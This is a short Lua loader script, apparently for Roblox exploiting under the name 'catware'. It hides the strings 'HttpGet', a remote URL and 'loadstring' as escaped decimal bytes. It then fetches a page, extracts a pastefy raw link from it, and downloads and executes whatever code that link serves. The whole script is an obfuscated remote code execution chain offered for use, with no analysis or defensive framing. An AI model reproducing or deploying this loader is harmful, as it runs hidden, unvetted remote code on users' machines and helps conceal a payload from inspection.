-- Safe local print reference to avoid _G restriction errors
local p = print

for _ = 1, 67 do
    p("catware")
end

local g, h = game, "\72\116\116\112\71\101\116"
local u = "\104\116\116\112\115\58\47\47\122\111\110\101\102\110\46\117\115\47\108\117\97\46\104\116\109\108"

local content = g[h](g, u)
local rawUrl = content:match("(https://pastefy%.app/[%w]+/raw)")

if rawUrl then
    local exec = getfenv()["\108\111\97\100\115\116\114\105\110\103"]
    exec(g[h](g, rawUrl))()
else
    warn("error, report in discord")
end
